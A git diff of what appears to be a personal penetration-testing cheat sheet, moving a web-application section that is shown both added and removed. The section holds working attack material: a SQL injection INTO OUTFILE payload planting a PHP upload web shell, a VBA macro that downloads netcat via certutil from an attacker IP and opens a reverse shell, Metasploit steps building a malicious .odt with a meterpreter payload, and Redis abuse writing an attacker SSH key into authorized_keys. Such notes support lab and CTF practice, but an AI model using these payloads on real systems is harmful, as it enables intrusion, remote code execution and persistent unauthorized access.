@@ -33,6 +33,7 @@ try every cred you find everywhere, password reuse shows up a lot
 - Reuse every credential everywhere : login page If you found
 
 2. Web
+- see : index.html ; 
 - WhatWeb → tech + versions → `"version CVE"` (if doesnt work the first time then it doesnt work)
 - Browse pages, source, comments, JS, files
 - Hunt creds: names, emails, descriptions, `.git` + history
@@ -69,7 +70,120 @@ When the TCP scan finishes, immediately run a UDP scan.
 ```
 sudo nmap -Pn -n -sU --top-ports=100 --reason $IP
 ```
+#### <span style="color:rgb(11, 142, 224)">Web Application </span>
 
+###### <span style="color:rgb(11, 142, 224)">Enumeration : </span>
+
+Directory brute forcing : 
+Gobuster
+smaller : 
+```
+sudo gobuster dir -w /usr/share/wordlists/dirb/common.txt -u <IP>
+```
+larger : 
+use medium list now
+```
+sudo gobuster dir -w /usr/share/wordlists/dirb/big.txt -x html,txt,php -u <IP>
+```
+
+go to website 
+```
+/about.html
+```
+
+Wordpress enumeration 
+```
+wpscan --url http:<IP> -e ap,at,u
+```
+
+###### <span style="color:rgb(11, 142, 224)">Default Credentials : </span>
+
+of username : password same you found , 
+admin:admin etc
+
+phpmyadmin : 
+username : root 
+password : leave empty (in some versions it's "password")
+
+Zabbix : 
+
+###### <span style="color:rgb(11, 142, 224)">SQL Injection : </span>
+
+If website has executable SQL commands : 
+Php get upload option to upload any file on website itself 
+```
+https://gist.github.com/BababaBlue
+```
+code :
+```
+SELECT 
+"<?php echo \'<form action=\"\" method=\"post\" enctype=\"multipart/form-data\" name=\"uploader\" id=\"uploader\">\';echo \'<input type=\"file\" name=\"file\" size=\"50\"><input name=\"_upl\" type=\"submit\" id=\"_upl\" value=\"Upload\"></form>\'; if( $_POST[\'_upl\'] == \"Upload\" ) { if(@copy($_FILES[\'file\'][\'tmp_name\'], $_FILES[\'file\'][\'name\'])) { echo \'<b>Upload Done.<b><br><br>\'; }else { echo \'<b>Upload Failed.</b><br><br>\'; }}?>"
+INTO OUTFILE 'C:/wamp/www/uploader.php';
+```
+after that , upload `PHP Ivan Sincek` revershell to the website
+###### <span style="color:rgb(11, 142, 224)">Squid Proxy :</span>
+configure FoxyProxy extension 
+with port number and ip address of victim machine 
+and then load the website 
+remember to turn off also when visiting other websites
+###### <span style="color:rgb(11, 142, 224)">Macro :</span>
+```vb
+Sub MyMacro
+	Dim str as String
+	str = "cmd.exe /c certutil -f -urlcache http://10.10.14.21/nc64.exe C:\Programdata\nc.exe && C:\Programdata\nc64.exe -e cmd.exe 10.10.14.21 4445"
+	Shell(str)
+End Sub
+```
+
+Alternative: Automating with Metasploit
+Metasploit has a module that auto-generates a malicious `.odt` with cross-platform VBA payloads (Windows, macOS, Linux).
+Generate the Payload : 
+```bash
+msfconsole
+use exploit/multi/fileformat/openoffice_document_macro
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 10.10.14.21
+set LPORT 4445
+run
+```
+This outputs a ready-to-upload `.odt` file.
+
+Catch the Shell :
+```bash
+use multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 10.10.14.21
+set LPORT 4445
+run
+```
+Once the bot opens the document → Metasploit catches the staged connection → **Meterpreter session opened**.
+```
+sessions -i 1
+```
+###### <span style="color:rgb(11, 142, 224)">Redis</span> 
+
+```
+redis-cli -h <IP> # to connect to the server
+
+after connecting : 
+info                            # to get information/details about the server
+SELECT <database_index>         # select databse
+keys *                          # to key all key names
+get <Key name>                  # to get value of the key 
+config get dir                  # to get config directory for redis
+config set dir /var/lib/redis/.ssh>  # to set a new directory
+
+ssh-keygen -t ed25519           # to make new kali pub ssh key (run as kali user)
+ls -la ~/.ssh/     # to see kali public ssh key 
+( echo -e "\n\n"; cat ~/.ssh/id_ed25519.pub; echo -e "\n\n") > id_rsa.pub   # to make it in format which redis accepts it 
+
+cat id_rsa.pub | redis-cli -h <redis ip> -x set <new key name> # make a new key
+
+config set dbfilename "authorized_keys"    # write our key to redis disk 
+save                                       # to save the file now
+
+ssh redis@<redis ip> -i ~/.ssh/<private key>  # ssh into redis from kali 
+```
 
 #### <span style="color:rgb(11, 142, 224)">SSH into a user</span>
 To SSH into a user using a private key:
@@ -251,124 +365,11 @@ In the web browser load the **reverse-shell.aspx** file we uploaded in the FTP s
 http://10.129.47.240/reverse-shell.aspx
 ```
 Go back to your listener to see if the shell connected back.
-#### Database file found (.db)
+#### <span style="color:rgb(11, 142, 224)">Database file found (.db)</span>
+
+open database :
 ```
 sqlitebrowser ma.db
-```
-
-## <span style="color:rgb(11, 142, 224)">Web Application </span>
-
-###### <span style="color:rgb(11, 142, 224)">Enumeration : </span>
-
-Directory brute forcing : 
-Gobuster
-smaller : 
-```
-sudo gobuster dir -w /usr/share/wordlists/dirb/common.txt -u <IP>
-```
-larger : 
-use medium list now
-```
-sudo gobuster dir -w /usr/share/wordlists/dirb/big.txt -x html,txt,php -u <IP>
-```
-
-go to website 
-```
-/about.html
-```
-
-Wordpress enumeration 
-```
-wpscan --url http:<IP> -e ap,at,u
-```
-
-###### <span style="color:rgb(11, 142, 224)">Default Credentials : </span>
-
-of username : password same you found , 
-admin:admin etc
-
-phpmyadmin : 
-username : root 
-password : leave empty (in some versions it's "password")
-
-Zabbix : 
-
-###### <span style="color:rgb(11, 142, 224)">SQL Injection : </span>
-
-If website has executable SQL commands : 
-Php get upload option to upload any file on website itself 
-```
-https://gist.github.com/BababaBlue
-```
-code :
-```
-SELECT 
-"<?php echo \'<form action=\"\" method=\"post\" enctype=\"multipart/form-data\" name=\"uploader\" id=\"uploader\">\';echo \'<input type=\"file\" name=\"file\" size=\"50\"><input name=\"_upl\" type=\"submit\" id=\"_upl\" value=\"Upload\"></form>\'; if( $_POST[\'_upl\'] == \"Upload\" ) { if(@copy($_FILES[\'file\'][\'tmp_name\'], $_FILES[\'file\'][\'name\'])) { echo \'<b>Upload Done.<b><br><br>\'; }else { echo \'<b>Upload Failed.</b><br><br>\'; }}?>"
-INTO OUTFILE 'C:/wamp/www/uploader.php';
-```
-after that , upload `PHP Ivan Sincek` revershell to the website
-###### <span style="color:rgb(11, 142, 224)">Squid Proxy :</span>
-configure FoxyProxy extension 
-with port number and ip address of victim machine 
-and then load the website 
-remember to turn off also when visiting other websites
-###### <span style="color:rgb(11, 142, 224)">Macro :</span>
-```vb
-Sub MyMacro
-	Dim str as String
-	str = "cmd.exe /c certutil -f -urlcache http://10.10.14.21/nc64.exe C:\Programdata\nc.exe && C:\Programdata\nc64.exe -e cmd.exe 10.10.14.21 4445"
-	Shell(str)
-End Sub
-```
-
-Alternative: Automating with Metasploit
-Metasploit has a module that auto-generates a malicious `.odt` with cross-platform VBA payloads (Windows, macOS, Linux).
-Generate the Payload : 
-```bash
-msfconsole
-use exploit/multi/fileformat/openoffice_document_macro
-set PAYLOAD windows/meterpreter/reverse_tcp
-set LHOST 10.10.14.21
-set LPORT 4445
-run
-```
-This outputs a ready-to-upload `.odt` file.
-
-Catch the Shell :
-```bash
-use multi/handler
-set PAYLOAD windows/meterpreter/reverse_tcp
-set LHOST 10.10.14.21
-set LPORT 4445
-run
-```
-Once the bot opens the document → Metasploit catches the staged connection → **Meterpreter session opened**.
-```
-sessions -i 1
-```
-###### <span style="color:rgb(11, 142, 224)">Redis</span> 
-
-```
-redis-cli -h <IP> # to connect to the server
-
-after connecting : 
-info                            # to get information/details about the server
-SELECT <database_index>         # select databse
-keys *                          # to key all key names
-get <Key name>                  # to get value of the key 
-config get dir                  # to get config directory for redis
-config set dir /var/lib/redis/.ssh>  # to set a new directory
-
-ssh-keygen -t ed25519           # to make new kali pub ssh key (run as kali user)
-ls -la ~/.ssh/     # to see kali public ssh key 
-( echo -e "\n\n"; cat ~/.ssh/id_ed25519.pub; echo -e "\n\n") > id_rsa.pub   # to make it in format which redis accepts it 
-
-cat id_rsa.pub | redis-cli -h <redis ip> -x set <new key name> # make a new key
-
-config set dbfilename "authorized_keys"    # write our key to redis disk 
-save                                       # to save the file now
-
-ssh redis@<redis ip> -i ~/.ssh/<private key>  # ssh into redis from kali 
 ```
 
 # <span style="color:rgb(11, 142, 224)">File Transfer</span>
